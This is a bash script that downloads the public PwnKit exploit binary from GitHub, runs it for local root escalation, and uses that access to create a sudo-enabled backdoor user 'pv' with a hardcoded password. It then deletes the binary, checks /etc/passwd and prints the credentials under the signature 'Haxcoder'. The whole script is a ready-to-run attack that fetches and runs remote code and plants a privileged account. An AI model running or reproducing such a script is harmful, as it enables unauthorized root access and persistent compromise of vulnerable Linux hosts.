#!/bin/bash
output=$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit ; chmod +x ./PwnKit ; ./PwnKit 'adduser --disabled-password --gecos "" pv ; usermod -aG sudo pv ; echo "pv:pinoyvalot" | sudo chpasswd ; cat /etc/passwd')
rm -rf PwnKit
# Print the outpu
if echo "$output" | grep -q "^pv:"; then
    echo "Privileged Escalation Success"
    echo "==================="
    echo "username: pv"
    echo "password: pinoyvalot"
    echo "==================="
    echo "CREATED BY: Haxcoder"
else
    echo "Error! Server may not be vulnerable to exploit"
fi
